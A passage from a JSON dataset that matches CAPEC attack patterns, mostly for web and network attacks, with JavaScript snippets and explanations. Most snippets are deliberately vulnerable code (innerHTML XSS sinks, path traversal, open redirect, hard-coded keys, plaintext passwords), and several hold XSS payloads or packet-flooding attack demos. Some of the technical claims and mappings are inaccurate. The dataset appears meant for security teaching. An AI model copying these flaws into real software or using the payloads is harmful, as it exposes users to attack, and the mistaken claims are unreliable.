        "description": "This code snippet demonstrates a Cross Frame Scripting (XFS) attack. The malicious page contains an iframe that loads a legitimate website. Once the iframe is loaded, the malicious JavaScript attempts to interact with the legitimate page. It tries to inject an XSS payload by adding an IMG tag with an onerror attribute, and it also attempts a CSRF attack by submitting a form within the iframe. This attack leverages improper restriction of rendered UI layers or frames (CWE-1021), improper neutralization of input during web page generation (CWE-79), and cross-site request forgery (CWE-352)."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  var userInput = document.location.hash.substring(1);\n  var targetElement = document.getElementById('output');\n  targetElement.innerHTML = 'User input: ' + userInput;\n});",
        "description": "This JavaScript code snippet demonstrates a DOM-Based XSS vulnerability. When the page loads, it extracts the user input from the URL hash (everything after the '#' symbol) and directly inserts it into the innerHTML of an element with the ID 'output'. This code does not perform any input validation or output encoding, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the hash, which would then be executed in the context of the web page, bypassing any server-side filtering. This example embodies the main idea of CAPEC-63 (DOM-Based XSS) and highlights related weaknesses such as improper input validation (CWE-20) and improper neutralization of input during web page generation (CWE-79)."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  const targetDomain = 'example.com';\n\n  dns.reverse(clientIP, (err, hostnames) => {\n    if (err) {\n      res.writeHead(500);\n      res.end('DNS resolution error');\n      return;\n    }\n\n    if (hostnames.includes(targetDomain)) {\n      res.writeHead(200);\n      res.end('Access granted');\n    } else {\n      res.writeHead(403);\n      res.end('Access denied');\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server running at http://0.0.0.0:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on all network interfaces (0.0.0.0) and processes incoming requests. It uses reverse DNS resolution to determine the hostname associated with the client's IP address and makes an access control decision based on the resolved hostname. If the hostname matches 'example.com', access is granted; otherwise, access is denied. This code embodies the main idea of the CAPEC 'DNS Blocking' by demonstrating how an adversary could intercept and manipulate DNS requests to control access to services. The code also highlights related CWEs, such as reliance on reverse DNS resolution for security-critical actions (CWE-350), binding to an unrestricted IP address (CWE-1327), and reliance on IP address for authentication (CWE-291)."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  const blockedIPs = ['192.168.1.100', '10.0.0.1']; // Example blocked IPs\n\n  if (blockedIPs.includes(clientIP)) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access Denied');\n    return;\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Hello, World!');\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that blocks access from specific IP addresses. The server listens on all network interfaces (0.0.0.0), which is a vulnerability (CWE-1327). It checks the client's IP address against a list of blocked IPs and denies access if the IP is found in the list (CWE-291). The server does not verify the identity of the client beyond the IP address, which can be spoofed (CWE-300, CWE-923). This represents the main idea of the CAPEC, where an adversary can block or drop packets destined for a target IP address, preventing access to the service."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Reflected XSS Example</title>\n</head>\n<body>\n    <h1>Search Results</h1>\n    <div id=\"results\"></div>\n    <script>\n        // Simulate user input from URL parameter\n        var params = new URLSearchParams(window.location.search);\n        var query = params.get('query');\n\n        // Vulnerable code: directly inserting user input into the DOM without proper sanitization\n        document.getElementById('results').innerHTML = 'You searched for: ' + query;\n    </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Reflected XSS vulnerability. The script extracts a 'query' parameter from the URL and directly inserts it into the DOM without proper sanitization. This allows an attacker to craft a URL with malicious JavaScript code in the 'query' parameter, which will be executed in the victim's browser when they visit the URL. This example embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) by showing how user input can be improperly handled, leading to XSS attacks."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Stored XSS Example</title>\n</head>\n<body>\n    <h1>Comment Section</h1>\n    <form method=\"POST\" action=\"/submit_comment\">\n        <textarea name=\"comment\"></textarea>\n        <button type=\"submit\">Submit</button>\n    </form>\n    <div id=\"comments\">\n        <!-- Comments will be inserted here -->\n        <script>\n            // Simulate fetching comments from a server\n            var comments = [\n                \"<img src=x onerror=alert('XSS')>\",\n                \"<script>alert('Stored XSS');</script>\",\n                \"<b>Normal Comment</b>\"\n            ];\n            comments.forEach(function(comment) {\n                document.getElementById('comments').innerHTML += '<p>' + comment + '</p>';\n            });\n        </script>\n    </div>\n</body>\n</html>",
        "description": "This code snippet demonstrates a stored XSS vulnerability. The web page includes a form for submitting comments, which are then displayed on the page without proper sanitization. The comments array simulates comments fetched from a server, including malicious scripts. When these comments are inserted into the DOM, the malicious scripts execute, demonstrating the stored XSS attack. This example highlights CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags), and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { maxAge: 60000 } // Insufficient session expiration\n}));\n\napp.post('/login', (req, res) => {\n  // Improper authentication\n  if (req.body.username === 'admin' && req.body.password === 'password') {\n    req.session.user = 'admin';\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  // Client-side enforcement of server-side security\n  if (req.session.user) {\n    res.send('Welcome to the dashboard');\n  } else {\n    res.send('Please log in first');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application with session management that embodies the main idea of Session Hijacking (CAPEC-288). The code includes several vulnerabilities related to the described CWEs:\n\n1. **Improper Authentication (CWE-287)**: The login endpoint uses a hardcoded username and password without proper authentication mechanisms, making it easy for an attacker to guess or brute-force credentials.\n\n2. **Insufficient Session Expiration (CWE-613)**: The session cookie is set to expire after 60 seconds, which is insufficient and could allow an attacker to reuse old session credentials.\n\n3. **Client-Side Enforcement of Server-Side Security (CWE-602)**: The dashboard endpoint relies on the client to check if the user is authenticated, which can be easily bypassed by an attacker.\n\nThis code snippet highlights the risks associated with improper session management and authentication practices, making it vulnerable to session hijacking attacks."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n    console.log('Connected');\n    client.write('GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP client using the 'net' module to connect to a server on port 8080. The client sends an HTTP GET request to the server. This code embodies the CAPEC 'Traffic Injection' by showing how an adversary could inject traffic into a network connection. The related CWEs are represented as follows: CWE-940 (Improper Verification of Source of a Communication Channel) is shown by the lack of verification of the server's identity; CWE-319 (Cleartext Transmission of Sensitive Information) is represented by the transmission of the HTTP request in cleartext; CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) is implied by the lack of integrity checks on the received data. This code does not handle message integrity, source verification, or encryption, making it vulnerable to traffic injection attacks."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst targetHost = 'target.server.com';\nconst targetPort = 80;\n\nclient.connect(targetPort, targetHost, () => {\n  console.log('Connected to target server');\n  // Simulate sending a reset packet\n  client.write('RST');\n  client.end();\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err);\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of a connection reset attack using Node.js's 'net' module. The code connects to a target server on a specified port and immediately sends a 'RST' (reset) packet to simulate a connection reset attack. This action forces the server to close the connection abruptly. The code embodies the main idea of CAPEC-Connection Reset by injecting a reset packet to disrupt the communication channel. The related CWEs provide additional context: CWE-940 (Improper Verification of Source of a Communication Channel) is relevant as the server does not verify the source of the reset packet, CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) is relevant as the reset packet is not verified for integrity, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) is relevant as the reset packet could be sent to an unintended destination. This code snippet is a simplified representation and should not be used for malicious purposes."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "const net = require('net');\n\nconst targetHost = 'example.com';\nconst targetPort = 80;\nconst fakeRSTPacket = Buffer.from('45000028a6f400004006b1e6c0a80001c0a80002', 'hex');\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetHost, () => {\n  console.log('Connected to target');\n  client.write(fakeRSTPacket);\n  console.log('Sent fake RST packet');\n  client.destroy();\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP RST Injection attack. It uses the 'net' module to create a TCP connection to a target server (example.com on port 80). Once connected, it sends a fake TCP RST packet to the server, which aims to terminate the TCP connection. This attack exploits the lack of proper verification of the source of a communication channel (CWE-940) and can disrupt legitimate communication between a client and server. The code also includes basic error handling for connection issues."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('File not found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.write(data);\n      res.end();\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from the file system based on the URL requested by the client. The 'filePath' is constructed using 'path.join(__dirname, req.url)', which concatenates the server's directory with the requested URL path. This approach is vulnerable to Absolute Path Traversal attacks (CAPEC-36) because it does not properly sanitize or validate the 'req.url' input. An attacker could exploit this by sending requests with paths like '../../etc/passwd' to access sensitive files outside the intended directory. The code demonstrates CWE-22, CWE-23, CWE-25, and CWE-73 by allowing external input to influence file paths without proper neutralization of special path elements."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst targetDomain = 'example.com';\n\n// Vulnerable function that relies on reverse DNS resolution\nfunction performSecurityCriticalAction(ip) {\n  dns.reverse(ip, (err, hostnames) => {\n    if (err) {\n      console.error('Reverse DNS lookup failed:', err);\n      return;\n    }\n    if (hostnames.includes(targetDomain)) {\n      console.log('Performing security-critical action for:', ip);\n      // Security-critical action here\n    } else {\n      console.log('Hostname mismatch. Action aborted.');\n    }\n  });\n}\n\n// Simulate a DNS spoofing attack\nconst spoofedIP = '192.0.2.1';\nperformSecurityCriticalAction(spoofedIP);",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to DNS Spoofing (CAPEC-139). The function `performSecurityCriticalAction` relies on reverse DNS resolution to make a security-critical decision. It checks if the resolved hostname matches a target domain before performing an action. However, this approach is vulnerable to DNS spoofing attacks, where an attacker can manipulate DNS responses to falsely associate an IP address with a trusted hostname. This can lead to unauthorized actions being performed. The code also simulates a DNS spoofing attack by calling the function with a spoofed IP address."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Transmitting sensitive data in cleartext\nfunction transmitData(data) {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/api', true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify({ data: data }));\n}\n\n// Simulate a terrestrial jamming attack by intercepting the transmission\nfunction simulateJamming() {\n  console.log('Jamming signal detected. Data transmission disrupted.');\n}\n\n// Transmit sensitive data\ntransmitData(sensitiveData);\n\n// Simulate jamming\nsimulateJamming();",
        "description": "This JavaScript code snippet demonstrates the transmission of sensitive data (user password) in cleartext over an HTTP connection, which can be intercepted by unauthorized actors. The `transmitData` function sends the sensitive data to a server without encryption, embodying CWE-319 (Cleartext Transmission of Sensitive Information). The `simulateJamming` function represents a terrestrial jamming attack, where the transmission is disrupted by an adversary. This scenario highlights the vulnerability of transmitting sensitive information without proper encryption and the potential for disruption by jamming signals, aligning with the CAPEC description of Terrestrial Jamming."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst users = { 'user1': 'password1', 'user2': 'password2' }; // CWE-522: Insufficiently Protected Credentials\nlet loginAttempts = {}; // CWE-307: Improper Restriction of Excessive Authentication Attempts\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (!loginAttempts[username]) loginAttempts[username] = 0;\n  if (loginAttempts[username] >= 5) { // CWE-307: No lockout mechanism\n    return res.status(429).send('Too many attempts, try again later.');\n  }\n  if (users[username] && users[username] === password) { // CWE-308: Single-factor Authentication\n    loginAttempts[username] = 0;\n    return res.status(200).send('Login successful');\n  } else {\n    loginAttempts[username]++;\n    return res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet represents a simple Express.js server with a login endpoint. It embodies the main idea of CAPEC- Credential Stuffing by demonstrating how an adversary could exploit weak authentication mechanisms. The code includes several related CWEs: CWE-522 (Insufficiently Protected Credentials) by storing passwords in plain text, CWE-307 (Improper Restriction of Excessive Authentication Attempts) by not implementing a proper lockout mechanism after multiple failed attempts, and CWE-308 (Use of Single-factor Authentication) by relying solely on username and password for authentication. The code highlights the vulnerabilities that can be exploited in a credential stuffing attack."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    console.log('Received:', data.toString());\n    // CWE-924: No integrity check\n    if (data.toString().includes('STOP')) {\n      // CWE-923: No endpoint verification\n      socket.write('Stopping server...');\n      server.close();\n    } else {\n      // CWE-406: No control of message volume\n      for (let i = 0; i < 1000; i++) {\n        socket.write('Echo: ' + data.toString());\n      }\n    }\n  });\n\n  // CWE-421: Race condition on alternate channel\n  setTimeout(() => {\n    socket.write('Alternate channel open');\n  }, 1000);\n});\n\nserver.listen(8080, '127.0.0.1');\nconsole.log('Server listening on port 8080');",
        "description": "This JavaScript code snippet creates a TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code demonstrates several vulnerabilities: \n1. CWE-319: Sensitive information is logged in cleartext.\n2. CWE-924: There is no integrity check on the received data.\n3. CWE-923: The server does not verify the endpoint before performing privileged operations.\n4. CWE-406: The server does not control the volume of messages sent back to the client, potentially leading to network amplification.\n5. CWE-421: An alternate communication channel is opened without proper access control, leading to a potential race condition.\n\nThese vulnerabilities collectively illustrate the concept of 'Jamming,' where an adversary can disrupt communications by exploiting these weaknesses."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "const crypto = require('crypto');\n\n// Using an obsolete function for cryptographic operations\nfunction insecureHash(data) {\n  return crypto.createHash('md5').update(data).digest('hex');\n}\n\n// Simulating a security decision based on DNS lookup\nconst dns = require('dns');\nfunction isTrustedDomain(domain, callback) {\n  dns.lookup(domain, (err, address) => {\n    if (err) {\n      callback(false);\n    } else {\n      // Making a security decision based on DNS lookup\n      callback(address === '192.168.1.1');\n    }\n  });\n}\n\n// Example usage\nconst data = 'sensitive data';\nconsole.log('Insecure Hash:', insecureHash(data));\n\nisTrustedDomain('example.com', (isTrusted) => {\n  if (isTrusted) {\n    console.log('Domain is trusted');\n  } else {\n    console.log('Domain is not trusted');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the use of deprecated and insecure practices, aligning with the CAPEC and related CWEs. The `insecureHash` function uses the obsolete MD5 hashing algorithm (CWE-477), which is known to be insecure. The `isTrustedDomain` function makes a security decision based on a DNS lookup (CWE-247), which is unreliable and can be spoofed. These practices highlight the risks of using outdated functions and making security decisions based on potentially unreliable data."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "const express = require('express');\nconst app = express();\n\nlet resourceCount = 0;\nconst MAX_RESOURCES = 100;\n\napp.get('/allocate', (req, res) => {\n  if (resourceCount >= MAX_RESOURCES) {\n    return res.status(503).send('Service Unavailable: Resource limit reached');\n  }\n  resourceCount++;\n  res.send('Resource allocated');\n});\n\napp.get('/release', (req, res) => {\n  if (resourceCount > 0) {\n    resourceCount--;\n    res.send('Resource released');\n  } else {\n    res.status(400).send('No resources to release');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allocates and releases resources. The server has a maximum limit of 100 resources that can be allocated. The '/allocate' endpoint increments the resource count until the maximum limit is reached, at which point it returns a 'Service Unavailable' status. The '/release' endpoint decrements the resource count if there are any resources to release. This code demonstrates the concept of resource allocation without proper limits (CWE-770) and uncontrolled resource consumption (CWE-400), which can lead to a blockage of system resources as described in the CAPEC."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "const wifiChannel = 'channel_6';\nconst deauthFrame = new Uint8Array([0xC0, 0x00, 0x3A, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);\n\nfunction jamWiFi() {\n  setInterval(() => {\n    sendDeauthFrame(wifiChannel, deauthFrame);\n  }, 100);\n}\n\nfunction sendDeauthFrame(channel, frame) {\n  // Simulate sending a deauthentication frame on the specified channel\n  console.log(`Sending deauth frame on ${channel}:`, frame);\n}\n\njamWiFi();",
        "description": "This JavaScript code snippet simulates a Wi-Fi jamming attack by repeatedly sending deauthentication frames on a specified Wi-Fi channel. The `jamWiFi` function uses `setInterval` to continuously call `sendDeauthFrame`, which logs the action of sending a deauthentication frame. This represents the CAPEC scenario of Wi-Fi jamming by flooding the access point with deauthentication frames. The code also touches on related CWEs: it does not verify the source of the communication (CWE-940), does not restrict the communication channel to intended endpoints (CWE-923), and does not ensure message integrity (CWE-924)."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(12345, '192.168.1.1', () => {\n  console.log('Connected to cell tower');\n  // CWE-319: Transmitting sensitive information in cleartext\n  client.write('AUTH: user=admin&pass=1234');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-924: No integrity check on received message\n  if (data.includes('STATUS:')) {\n    console.log('Status message received');\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-300: Channel accessible by non-endpoint\nconst attacker = new net.Socket();\nattacker.connect(12345, '192.168.1.1', () => {\n  console.log('Attacker connected to cell tower');\n  // Overwhelm with false status messages\n  setInterval(() => {\n    attacker.write('STATUS: false');\n  }, 100);\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a cellular jamming attack. The client connects to a cell tower and sends sensitive information in cleartext (CWE-319). It also receives messages without verifying their integrity (CWE-924). An attacker connects to the same cell tower and sends false status messages at regular intervals, overwhelming the communication channel (CWE-300). This represents the main idea of the CAPEC by showing how an attacker can disrupt communication between a cellular user device and a cell tower."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data, algorithm) {\n  const key = 'hardcodedkey123456'; // CWE-321: Use of Hard-coded Cryptographic Key\n  const iv = crypto.randomBytes(16);\n  const cipher = crypto.createCipheriv(algorithm, Buffer.from(key), iv);\n  let encrypted = cipher.update(data);\n  encrypted = Buffer.concat([encrypted, cipher.final()]);\n  return iv.toString('hex') + ':' + encrypted.toString('hex');\n}\n\nfunction negotiateAlgorithm(preferredAlgorithms) {\n  const supportedAlgorithms = ['aes-256-cbc', 'aes-128-cbc', 'des']; // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  for (let alg of preferredAlgorithms) {\n    if (supportedAlgorithms.includes(alg)) {\n      return alg; // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n    }\n  }\n  return 'des'; // Default to a weak algorithm if no match found\n}\n\nconst data = 'Sensitive Information';\nconst preferredAlgorithms = ['aes-128-cbc', 'des'];\nconst selectedAlgorithm = negotiateAlgorithm(preferredAlgorithms);\nconst encryptedData = encryptData(data, selectedAlgorithm);\nconsole.log('Encrypted Data:', encryptedData);",
        "description": "This JavaScript code snippet demonstrates a scenario where a less secure encryption algorithm is selected during negotiation, embodying the main idea of CAPEC-Weakening of Cellular Encryption. The `negotiateAlgorithm` function selects an encryption algorithm from a list of preferred algorithms, potentially choosing a weaker one (CWE-757). The `encryptData` function uses a hard-coded cryptographic key (CWE-321) and includes a risky algorithm ('des') in the supported algorithms list (CWE-327). This represents how an attacker could force a mobile device to use weak or no encryption, making the data vulnerable."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "const fs = require('fs');\n\nfunction readConfig() {\n  try {\n    let data = fs.readFileSync('/etc/config.json', 'utf8');\n    let config = JSON.parse(data);\n    return config;\n  } catch (err) {\n    console.error('Error reading config:', err);\n    // Improper handling of faults\n    return null;\n  }\n}\n\nfunction performCriticalOperation() {\n  let config = readConfig();\n  if (!config) {\n    // Obstruction: If config is null, the system is forced into a degraded state\n    console.error('Critical operation cannot proceed without config.');\n    return;\n  }\n  // Simulate a race condition by using a timeout\n  setTimeout(() => {\n    if (config.criticalSetting) {\n      console.log('Performing critical operation');\n    } else {\n      console.error('Critical setting is missing');\n    }\n  }, Math.random() * 1000);\n}\n\nperformCriticalOperation();",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can obstruct system interactions by causing a failure in reading a critical configuration file. The `readConfig` function attempts to read a configuration file and parse it. If an error occurs, it logs the error and returns null, representing improper handling of faults (CWE-1332). The `performCriticalOperation` function relies on this configuration. If the configuration is null, it logs an error and exits, simulating a system forced into a degraded state due to obstruction (CAPEC). Additionally, a race condition is simulated using a timeout, representing CWE-1298. This code embodies the main idea of CAPEC by showing how an obstruction in reading a configuration file can degrade system functionality."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\n// Use of a broken or risky cryptographic algorithm (CWE-327)\nconst algorithm = 'aes-128-cbc'; // Weak encryption algorithm\nconst key = '1234567890123456'; // Hard-coded cryptographic key (CWE-321)\nconst iv = crypto.randomBytes(16);\n\nconst encrypt = (text) => {\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n};\n\nconst decrypt = (encryptedText) => {\n  const decipher = crypto.createDecipheriv(algorithm, key, iv);\n  let decrypted = decipher.update(encryptedText, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n};\n\n// Example usage\nconst message = 'Sensitive data';\nconst encryptedMessage = encrypt(message);\nconsole.log('Encrypted:', encryptedMessage);\nconst decryptedMessage = decrypt(encryptedMessage);\nconsole.log('Decrypted:', decryptedMessage);",
        "description": "This JavaScript code snippet demonstrates the use of a broken or risky cryptographic algorithm (CWE-327) and a hard-coded cryptographic key (CWE-321) to encrypt and decrypt sensitive data. The algorithm used is 'aes-128-cbc', which is considered weak by modern standards. The key is hard-coded, making it easier for attackers to recover the encrypted data. This example embodies the main idea of the CAPEC by showing how weak encryption and poor key management can lead to vulnerabilities in cellular encryption, making it susceptible to cryptanalysis attacks."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!req.headers['x-expected-header']) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Bad Request');\n    return;\n  }\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const sensitiveData = 'user_password=12345';\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end(sensitiveData);\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. The server checks for a specific header in the incoming request to verify the source of the communication channel (CWE-940). If the header is missing, it responds with a 'Bad Request' message. However, if the header is present, it transmits sensitive information (a user password) in cleartext (CWE-319). This demonstrates the vulnerability of transmitting sensitive data without encryption, making it susceptible to interception, which aligns with the main idea of the CAPEC 'Cellular Traffic Intercept'."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "const http = require('http');\nconst sensitiveData = 'user_password=12345'; // CWE-201\n\nhttp.createServer((req, res) => {\n  if (req.url === '/debug') {\n    // CWE-1313: Activation of debug logic at runtime\n    console.log('Debug mode activated');\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Debug mode activated');\n  } else {\n    // CWE-319: Cleartext transmission of sensitive information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(sensitiveData);\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. The server has two main functionalities: \n1. If the URL '/debug' is accessed, it activates a debug mode at runtime (CWE-1313), which can alter the system's behavior and potentially expose sensitive information.\n2. For any other URL, it transmits sensitive information (user password) in cleartext (CWE-319), making it vulnerable to interception by unauthorized actors. This represents the main idea of the CAPEC 'Cellular Data Injection' by showing how an adversary could inject or intercept data to disrupt communications or conduct surveillance."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('<h1>Welcome to the trusted site</h1>');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server checks for a 'redirect' query parameter in the URL. If the 'redirect' parameter is present, the server responds with a 302 redirect to the specified URL. This demonstrates CWE-601 (URL Redirection to Untrusted Site), where user-controlled input is used to specify a link to an external site, potentially leading to phishing attacks. The code snippet embodies the main idea of BitSquatting by showing how a malicious actor could exploit a minor error (e.g., a bit flip in the domain name) to redirect traffic to an adversary-controlled site. The simplicity of the code highlights the ease with which such vulnerabilities can be introduced and exploited."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "const wifi = require('node-wifi');\nconst fs = require('fs');\n\nwifi.init({ iface: null });\n\nfunction logMacAddresses() {\n  wifi.scan((err, networks) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    const macAddresses = networks.map(network => network.mac);\n    fs.writeFile('mac_addresses.txt', macAddresses.join('\\n'), (err) => {\n      if (err) {\n        console.error('Error writing MAC addresses to file:', err);\n      } else {\n        console.log('MAC addresses logged successfully.');\n      }\n    });\n  });\n}\n\nlogMacAddresses();",
        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for nearby WiFi networks and logs their MAC addresses to a file named 'mac_addresses.txt'. The code initializes the WiFi module, scans for networks, extracts the MAC addresses, and writes them to a file. This embodies the main idea of the CAPEC 'WiFi MAC Address Tracking' by demonstrating how an attacker could passively listen for WiFi messages and log the associated MAC addresses. The code also touches on related CWEs: it transmits sensitive information (MAC addresses) to a file (CWE-201), and the file could be accessed by unauthorized actors if not properly secured (CWE-529)."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "const wifi = require('node-wifi');\n\nwifi.init({ iface: null });\n\nwifi.scan((error, networks) => {\n  if (error) {\n    console.error(error);\n  } else {\n    networks.forEach(network => {\n      if (network.ssid) {\n        console.log(`Detected SSID: ${network.ssid}`);\n      }\n    });\n  }\n});",
        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for available WiFi networks and logs the SSIDs of detected networks. The code initializes the WiFi module, performs a scan, and then iterates through the detected networks to print out their SSIDs. This embodies the main idea of the CAPEC 'WiFi SSID Tracking' by demonstrating how an attacker could passively listen for WiFi management frames to capture SSIDs. The related CWEs are represented in the context of transmitting sensitive information (SSID) without adequate verification or protection, making it accessible to unauthorized actors."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
